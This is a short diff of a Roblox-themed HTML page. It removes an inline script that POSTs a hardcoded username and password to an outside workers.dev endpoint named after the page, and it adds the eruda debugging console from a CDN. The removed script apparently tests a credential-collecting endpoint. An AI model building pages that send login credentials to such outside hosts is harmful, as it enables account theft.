@@ -41,15 +41,8 @@ input:focus{outline:none;border-color:#4b9be8;box-shadow:0 0 0 3px #4b9be822}
 @media(prefers-reduced-motion:reduce){*,*:before,*:after{animation-duration:.01ms!important;transition-duration:.01ms!important}}
 </style>
 </head>
-  <script>
-fetch("https://times-de-beatball---roblox.123456abcdef363.workers.dev", {
-  method: "POST",
-  body: JSON.stringify({ username: "teste", password: "teste" })
-})
-.then(r => r.json())
-.then(d => alert("OK: " + JSON.stringify(d)))
-.catch(e => alert("FALHOU: " + e.message));
-  </script>
+  <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+<script>eruda.init();</script>
  <body>
 <section id="home" class="page active">
 <h1>Times de beatball - Roblox</h1>
